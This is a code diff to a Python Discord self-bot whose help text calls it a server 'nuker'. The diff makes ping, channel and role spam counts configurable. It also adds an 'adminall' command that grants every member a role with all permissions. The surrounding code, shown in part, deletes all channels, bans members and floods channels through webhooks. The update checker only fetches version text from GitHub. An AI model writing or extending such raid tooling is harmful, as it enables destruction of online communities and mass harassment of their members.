@@ -1,3 +1,4 @@
+from discord import Permissions
 from discord.ext import commands
 import discord
 from asyncio import create_task 
@@ -7,6 +8,40 @@ import time
 import colorama
 from colorama import Fore
 import os
+import urllib3
+
+
+
+
+
+http = urllib3.PoolManager()
+
+get_last_ver = http.request('GET', 'https://raw.githubusercontent.com/glitch65/some-random-things-for-my-projects/main/fsb/version')
+get_changelog = http.request('GET', 'https://raw.githubusercontent.com/glitch65/some-random-things-for-my-projects/main/fsb/changelog')
+
+
+ver = get_last_ver.data.decode('utf-8')
+chl = get_changelog.data.decode('utf-8')
+
+
+curent_version = str(1.2)
+
+
+
+
+if curent_version == ver:
+    print(f'{Fore.GREEN}[Update checker]' + '\033[39m' + 'Your version does not need to be updated!')
+else:
+    print(f'{Fore.GREEN}[Update checker]' + '\033[39m' + 'New version of self bot ' + ver + ' is available!')
+    print(f'{Fore.GREEN}Changelog:')
+    print(f'{Fore.GREEN}' + chl)
+    print(f'{Fore.GREEN}Self bot will close automatically after 5 seconds!')
+    time.sleep(5)
+    quit()
+
+
+
+
 
 config = configparser.ConfigParser()
 
@@ -50,7 +85,12 @@ else:
                          'channels and roles name': 'nuked by five self bot',
                          'webhooks name': 'five self bot',
                          'server name':'nuked by five self bot',
-                         'ban reason': 'XDDDD' }
+                         'ban reason': 'XDDDD',
+                         'how much pings per channel do you want?': '60',
+                         'how much channels do you want?': '35', 
+                         'how much roles do you want?': '40',
+                         'admin role name': 'sh...'}
+    
     with open('cfg.ini', 'w') as cfg_file:
             config.write(cfg_file)
     print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Done!')
@@ -69,6 +109,11 @@ chnrln = config['BOT_CFG']['channels and roles name']
 wbn = config['BOT_CFG']['webhooks name']
 srvn = config['BOT_CFG']['server name']
 br = config['BOT_CFG']['ban reason']
+howmp = int(config['BOT_CFG']['how much pings per channel do you want?'])
+howmc = int(config['BOT_CFG']['how much channels do you want?'])
+howmr = int(config['BOT_CFG']['how much roles do you want?'])
+adrn = config['BOT_CFG']['admin role name']
+
 
 
 
@@ -120,7 +165,7 @@ async def createchannel(ctx,name):
     try:
         chan = await ctx.guild.create_text_channel(name=name)
         wb = await chan.create_webhook(name=wbn,avatar=icona)
-        create_task(sendch(ctx,wb,60))
+        create_task(sendch(ctx,wb,count=howmp))
     except: pass
 
 async def createrole(ctx):
@@ -142,9 +187,9 @@ async def start(ctx):
     for channel in ctx.guild.channels:
         create_task(killobject(obj=channel))
     create_task(bananaa(ctx=ctx))
-    for _ in range(40):
+    for _ in range(howmr):
         create_task(createrole(ctx))
-    for _ in range(35):    
+    for _ in range(howmc):    
         create_task(createchannel(ctx,name=chnrln))
 
 @client.command()
@@ -153,7 +198,7 @@ async def spam(ctx,howm:int,*,txt):
 
 @client.command()
 async def help(ctx):
-    await ctx.send('```Five self bot help | v 1.1 - Beta \n' + prefix + 'start = will nuke server like five nuker\n' + prefix + 'spam will spam with youre massage as much as you want -> (amout of massges) + (massage) like ' + prefix + 'spam 10 yooo ```') 
+    await ctx.send('```Five self bot help | v 1.2 - Beta \n' + prefix + 'start = will nuke server like five nuker\n' + prefix + 'spam will spam with youre massage as much as you want -> (amout of massges) + (massage) like ' + prefix + 'spam 10 yooo\n' + prefix + 'adminall will give everyone admin on this server```') 
 
 async def bananaa(ctx):
     for member in list(ctx.guild.members):
@@ -162,7 +207,13 @@ async def bananaa(ctx):
       except: pass
  
 
-
+@client.command()
+async def adminall(ctx):
+    await ctx.message.delete()
+    r =  await ctx.guild.create_role(name=adrn,permissions=Permissions.all())
+    for membe in list(ctx.guild.members):
+            await membe.add_roles(r)
+            
 
 
 
